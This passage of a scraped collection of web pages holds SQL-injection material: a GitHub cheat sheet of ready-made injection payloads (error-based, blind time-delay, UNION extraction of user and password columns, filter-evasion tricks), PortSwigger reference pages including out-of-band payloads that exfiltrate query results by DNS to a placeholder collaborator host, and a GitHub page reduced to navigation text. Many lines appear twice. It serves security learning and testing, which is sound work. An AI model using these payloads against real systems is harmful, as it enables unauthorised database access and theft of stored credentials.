figure out the vulnerable parameter\nNOTE: If it's a GET request don't forget to url encode the characters.\nparam=' --> try to get error param=\" --> try to get error param=' or 1=1 --> try if it works param=' or 1=0 --> check if it returns nothing param=' and 1=1 --> check if this works or produces error\nparam=' --> try to get error param=\" --> try to get error param=' or 1=1 --> try if it works param=' or 1=0 --> check if it returns nothing param=' and 1=1 --> check if this works or produces error\nTry with blind injection payloads if above commands does not produce error\n' or sleep(2) and 1=1# --> try get delay, sleep only operates when all other conditions are true and there is a requirement to operate it. ' or sleep(2)# --> try get delay admin' and sleep(2)# --> will delay only if the user admin exists ' union select sleep(2),null# --> check if it produces delay ' union select sleep(2),null,null,null,null# --> check if it produces delay, check for different number of columns\n' or sleep(2) and 1=1# --> try get delay, sleep only operates when all other conditions are true and there is a requirement to operate it. ' or sleep(2)# --> try get delay admin' and sleep(2)# --> will delay only if the user admin exists ' union select sleep(2),null# --> check if it produces delay ' union select sleep(2),null,null,null,null# --> check if it produces delay, check for different number of columns\nTry if above queries work by appending comment at the end\nparam=' or 1=1# --> try if it works param=' or 1=1 -- one space needed --> try if it works param=' or 1=1 // --> try if it works param= or 1=1# --> try if it works param=and or 1=1# --> try if it works param=' or 1=1-- sd --> try if it works ' AND (select 1)=1 <-- This should be TRUE Response -- subselect supported\nparam=' or 1=1# --> try if it works param=' or 1=1 -- one space needed --> try if it works param=' or 1=1 // --> try if it works param= or 1=1# --> try if it works param=and or 1=1# --> try if it works param=' or 1=1-- sd --> try if it works ' AND (select 1)=1 <-- This should be TRUE Response -- subselect supported\nNow that we know the vulnerable parameter, let's try guessing the table name:\n' AND (select 1 from admin limit 0,1)=1 <-- FALSE ' AND (select 1 from users limit 0,1)=1 <-- TRUE ======> Table found 'users'\n' AND (select 1 from admin limit 0,1)=1 <-- FALSE ' AND (select 1 from users limit 0,1)=1 <-- TRUE ======> Table found 'users'\n' AND (select substring(concat(1,pass),1,1) from users limit 0,1)=1 <-- FALSE ' AND (select substring(concat(1,password),1,1) from users limit 0,1)=1 <-- TRUE =====> Column 'password' found.\n' AND (select substring(concat(1,pass),1,1) from users limit 0,1)=1 <-- FALSE ' AND (select substring(concat(1,password),1,1) from users limit 0,1)=1 <-- TRUE =====> Column 'password' found.\nNow determine number of columns in the current table\nparam=' or 1=1 order by 1# param=' or 1=1 order by 10#\nparam=' or 1=1 order by 1# param=' or 1=1 order by 10#\nNow determine vulnerable columns or columns which are visible\nparam=' or 1=0 union select null,null,null# --> if it produces no error then try param=' or 1=0 union select 1,2,3# --> check which number shows in web page\nparam=' or 1=0 union select null,null,null# --> if it produces no error then try param=' or 1=0 union select 1,2,3# --> check which number shows in web page\nparam=' or 1=1 union select table_name,null,null from information_schema.tables# if it produces error try table_name at other positions\nparam=' or 1=1 union select table_name,null,null from information_schema.tables# if it produces error try table_name at other positions\nNow, lets say column 1,2 are shown in web page\nparam=' or 1=0 union select table_schema,null,null from information_schema.columns# --> display all database name Note 1=0 in above query to show only databases param=' or 1=0 union select version(),null,null from information_schema.columns# --> retrieve version param=' or 1=0 union select @@version,null,null from information_schema.columns# --> retrieve version in mssql param=' or 1=0 union select substring(version(),1,1)=1,null,null from information_schema.columns# --> return true if version is 1.x.x param=' or 1=0 union select substring(version(),1,1)=5,null,null from information_schema.columns# --> return true if version is 5.x.x param=' or 1=0 union select substring(version(),3,1)=2,null,null from information_schema.columns# --> return true if version is 5.2.x param=' or 1=0 union select table_name,null,null from information_schema.columns# --> display all table name param=' or 1=1 select table_name,null,null from information_schema.columns where table_schema='public'# --> display tables inside public database param=' or 1=1 select column_name,null,null from information_schema.columns where table_schema='public' and table_name='info'# --> display all columns of info table param=' or 1=1 select table_name as table,column_name as column,null from information_schema.columns#\nparam=' or 1=0 union select table_schema,null,null from information_schema.columns# --> display all database name Note 1=0 in above query to show only databases param=' or 1=0 union select version(),null,null from information_schema.columns# --> retrieve version param=' or 1=0 union select @@version,null,null from information_schema.columns# --> retrieve version in mssql param=' or 1=0 union select substring(version(),1,1)=1,null,null from information_schema.columns# --> return true if version is 1.x.x param=' or 1=0 union select substring(version(),1,1)=5,null,null from information_schema.columns# --> return true if version is 5.x.x param=' or 1=0 union select substring(version(),3,1)=2,null,null from information_schema.columns# --> return true if version is 5.2.x param=' or 1=0 union select table_name,null,null from information_schema.columns# --> display all table name param=' or 1=1 select table_name,null,null from information_schema.columns where table_schema='public'# --> display tables inside public database param=' or 1=1 select column_name,null,null from information_schema.columns where table_schema='public' and table_name='info'# --> display all columns of info table param=' or 1=1 select table_name as table,column_name as column,null from information_schema.columns#\nLet say the database name is public and table name is info with two columns in it id and name .\nparam=' or 1=0 union select id,null,null from public.info# --> display id column from table \"info\" param=' or 1=0 union select id,name,null from public.info# --> display id and name column from table \"info\" param=' or 1=0 union select id,name,null from public.info where id='papa'# --> display id and name of 'papa'\nparam=' or 1=0 union select id,null,null from public.info# --> display id column from table \"info\" param=' or 1=0 union select id,name,null from public.info# --> display id and name column from table \"info\" param=' or 1=0 union select id,name,null from public.info where id='papa'# --> display id and name of 'papa'\nwe can use case switching or commenting to bypass basic filters\nparam=' or 1=0 UniOn selEct id,null,null FroM public.info# param=' or 1=0 un/**/ion sele/**/ct id,null,null fr/**/om public.info# works in mssql\nparam=' or 1=0 UniOn selEct id,null,null FroM public.info# param=' or 1=0 un/**/ion sele/**/ct id,null,null fr/**/om public.info# works in mssql\nOracle does not have information schema and thus we need some alternatives for it. The link below can be helpful.\nhttps://stackoverflow.com/questions/8739203/oracle-query-to-fetch-column-names\nFor Adanced exploitation, we may use sqlmap\nhttp://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet\nhttp://garage4hackers.com/showthread.php?t=1990\nCheatsheet to exploit and learn SQL Injection.\nThere was an error while loading. Please reload this page .\nThere was an error while loading. Please reload this page .\nDo not share my personal information",
    "source": "https://github.com/AdmiralGaust/SQL-Injection-cheat-sheet",
    "metadata": {
      "title": "github.com"
    }
  },
  {
    "content": "Burp Suite's web vulnerability scanner\nWhat's the difference between Pro and Enterprise Edition?\nDownload the latest version of Burp Suite.\nLatest topics Web cache deception Web LLM attacks API testing NoSQL injection Race conditions View all topics\nAll content All labs All topics Mystery labs\nHall of Fame Leaderboard Interview - Kamil Vavra Interview - Johnny Villarreal Interview - Andres Rauschecker\nGet certified Get certified How to prepare How it works Practice exam Exam hints and guidance What the exam involves FAQs Validate your certification\nWhat is the impact of SQL injection?\nDetecting SQL injection vulnerabilities In different parts of the query In different contexts\nIn different parts of the query\nExamples of SQL injection Retrieving hidden data Subverting application logic Retrieving data from other tables Examining the database Blind SQL injection Second-order SQL injection\nRetrieving data from other tables\nExamining the database Querying the type and version Listing the contents\nUNION attacks Determining the number of columns Finding columns with a useful data type Retrieving interesting data Retrieving multiple values in a single column\nDetermining the number of columns\nFinding columns with a useful data type\nRetrieving multiple values in a single column\nBlind SQL injection What is blind SQL injection? Triggering conditional responses Error-based SQL injection Inferring information using conditional errors Extracting data via verbose error messages Triggering time delays Out-of-band (OAST) techniques Preventing blind SQL injection\nTriggering conditional responses\nError-based SQL injection Inferring information using conditional errors Extracting data via verbose error messages\nInferring information using conditional errors\nExtracting data via verbose error messages\nThis SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.\nYou can concatenate together multiple strings to make a single string.\nYou can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba .\nYou can use comments to truncate a query and remove the portion of the original query that follows your input.\nYou can query the database to determine its type and version. This information is useful when formulating more complicated attacks.\nSELECT banner FROM v$version SELECT version FROM v$instance\nYou can list the tables that exist in the database, and the columns that those tables contain.\nSELECT * FROM all_tables SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'\nSELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'\nSELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'\nSELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'\nYou can test a single boolean condition and trigger a database error if the condition is true.\nSELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual\nSELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END\n1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)\nSELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')\nExtracting data via visible error messages\nYou can potentially elicit error messages that leak sensitive data returned by your malicious query.\nSELECT 'foo' WHERE 1 = (SELECT 'secret') > Conversion failed when converting the varchar value 'secret' to data type int.\nSELECT CAST((SELECT password FROM users LIMIT 1) AS int) > invalid input syntax for integer: \"secret\"\nSELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) > XPATH syntax error: '\\secret'\nYou can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.\nDoes not support batched queries.\nQUERY-1-HERE; QUERY-2-HERE QUERY-1-HERE QUERY-2-HERE\nWith MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.\nYou can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.\ndbms_pipe.receive_message(('a'),10)\nYou can test a single boolean condition and trigger a time delay if the condition is true.\nSELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual\nIF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'\nSELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END\nSELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')\nYou can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.\n(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:\nSELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual\nThe following technique works on fully patched Oracle installations, but requires elevated privileges:\nSELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')\nexec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'\ncopy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'\nThe following techniques work on Windows only:\nLOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a')\nSELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'\nDNS lookup with data exfiltration\nYou can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.\nSELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual\ndeclare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree \"//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a\"')\ncreate OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN'''; execute c; END; $$ language plpgsql security definer; SELECT f();\nSELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'\nWant to track your progress and have a more personalized learning experience? (It's free!)",
    "source": "https://portswigger.net/web-security/sql-injection/cheat-sheet",
    "metadata": {
      "title": "PortSwigger SQLi"
    }
  },
  {
    "content": "Burp Suite's web vulnerability scanner\nWhat's the difference between Pro and Enterprise Edition?\nDownload the latest version of Burp Suite.\nLatest topics Web cache deception Web LLM attacks API testing NoSQL injection Race conditions View all topics\nAll content All labs All topics Mystery labs\nHall of Fame Leaderboard Interview - Kamil Vavra Interview - Johnny Villarreal Interview - Andres Rauschecker\nGet certified Get certified How to prepare How it works Practice exam Exam hints and guidance What the exam involves FAQs Validate your certification\nWhat is the impact of SQL injection?\nDetecting SQL injection vulnerabilities In different parts of the query In different contexts\nIn different parts of the query\nExamples of SQL injection Retrieving hidden data Subverting application logic Retrieving data from other tables Examining the database Blind SQL injection Second-order SQL injection\nRetrieving data from other tables\nExamining the database Querying the type and version Listing the contents\nUNION attacks Determining the number of columns Finding columns with a useful data type Retrieving interesting data Retrieving multiple values in a single column\nDetermining the number of columns\nFinding columns with a useful data type\nRetrieving multiple values in a single column\nBlind SQL injection What is blind SQL injection? Triggering conditional responses Error-based SQL injection Inferring information using conditional errors Extracting data via verbose error messages Triggering time delays Out-of-band (OAST) techniques Preventing blind SQL injection\nTriggering conditional responses\nError-based SQL injection Inferring information using conditional errors Extracting data via verbose error messages\nInferring information using conditional errors\nExtracting data via verbose error messages\nWhen an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the UNION keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.\nThe UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query. For example:\nSELECT a, b FROM table1 UNION SELECT c, d FROM table2\nThis SQL query returns a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2 .\nFor a UNION query to work, two key requirements must be met:\nThe individual queries must return the same number of columns.\nThe data types in each column must be compatible between the individual queries.\nTo carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:\nHow many columns are being returned from the original query.\nWhich columns returned from the original query are of a suitable data type to hold the results from the injected query.\nDetermining the number of columns required\nWhen you perform a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.\nOne method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs. For example, if the injection point is a quoted string within the WHERE clause of the original query, you would submit:\n' ORDER BY 1-- ' ORDER BY 2-- ' ORDER BY 3-- etc.\nThis series of payloads modifies the original query to order the results by different columns in the result set. The column in an ORDER BY clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:\nThe ORDER BY position number 3 is out of range of the number of items in the select list.\nThe application might actually return the database error in its HTTP response, but it may also issue a generic error response. In other cases, it may simply return no results at all. Either way, as long as you can detect some difference in the response, you can infer how many columns are being returned from the query.\nThe second method involves submitting a series of UNION SELECT payloads specifying a different number of null values:\n' UNION SELECT NULL-- ' UNION SELECT NULL,NULL-- ' UNION SELECT NULL,NULL,NULL-- etc.\nIf the number of nulls does not match the number of columns, the database returns an error, such as:\nAll queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.\nWe use NULL as the values returned from the injected SELECT query because the data types in each column must be compatible between the original and the injected queries. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.\nAs with the ORDER BY technique, the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a NullPointerException . In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective.\nOn Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:\n' UNION SELECT NULL FROM DUAL--\nThe payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.\nFor more details of database-specific syntax, see the SQL injection cheat sheet .\nFinding columns with a useful data type\nA SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.\nAfter you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of UNION SELECT payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:\n' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL-- ' UNION SELECT NULL,NULL,NULL,'a'--\nIf the column data type is not compatible with string data, the injected query will cause a database error, such as:\nConversion failed when converting the varchar value 'a' to data type int.\nIf an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.\nUsing a SQL injection UNION attack to retrieve interesting data\nWhen you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.\nThe original query returns two columns, both of which can hold string data.\nThe injection point is a quoted string within the WHERE clause.\nThe database contains a table called users with the columns username and password .\nIn this example, you can retrieve the contents of the users table by submitting the input:\n' UNION SELECT username, password FROM users--\nIn order to perform this attack, you need to know that there is a table called users with two columns called username and password . Without this information, you would have to guess the names of the tables and columns. All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.\nExamining the database in SQL injection attacks\nRetrieving multiple values within a single column\nIn some cases the query in the previous example may only return a single column.\nYou can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:\n' UNION SELECT username || '~' || password FROM users--\nThis uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.\nThe results from the query contain all the usernames and passwords, for example:\n... administrator~s3cure wiener~peter carlos~montoya ...\nDifferent databases use different syntax to perform string concatenation. For more details, see the SQL injection cheat sheet .\nWant to track your progress and have a more personalized learning experience? (It's free!)",
    "source": "https://portswigger.net/web-security/sql-injection/union-attacks",
    "metadata": {
      "title": "PortSwigger SQLi"
    }
  },
  {
    "content": "PayloadsAllTheThings/SQL Injection/README.md at master · swisskyrepo/PayloadsAllTheThings · GitHub Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert swisskyrepo / PayloadsAllTheThings Public Uh oh! There was an error while loading. Please reload this page . Notifications You must be signed in to change notification settings Fork 15.6k Star 68k Code Pull requests 10 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Pull requests Actions Projects Security Insights Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time.\nProduct GitHub Copilot Write better code with AI GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog\nGitHub Copilot Write better code with AI\nGitHub Models New Manage and compare prompts\nGitHub Advanced Security Find and fix vulnerabilities\nCodespaces Instant dev environments\nCode Review Manage code changes\nDiscussions Collaborate outside of code\nCode Search Find more, search less\nSolutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions\nResources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights\nOpen Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections\nGitHub Sponsors Fund open source developers\nThe ReadME Project GitHub community articles\nEnterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support\nEnterprise platform AI-powered developer platform\nGitHub Advanced Security Enterprise-grade security features\nCopilot for business Enterprise-grade AI features\nPremium Support Enterprise-grade 24/7 support\nSearch code, repositories, users, issues, pull requests...\nWe read every piece of feedback, and take your input very seriously.\nUse saved searches to filter your results more quickly\nTo see all available qualifiers, see our documentation .\nUh oh! There was an error while loading. Please reload this page .\nThere was an error while loading. Please reload this page .\nThere was an error while loading. Please reload this page .\nNotifications You must be signed in to change notification settings\nSecurity Uh oh! There was an error while loading. Please reload this page .\nThere was an error while loading. Please reload this page .\nThere was an error while loading. Please reload this page .\nDo not share my personal information",
    "source": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md",
    "metadata": {
      "title": "github.com"
    }
  }
]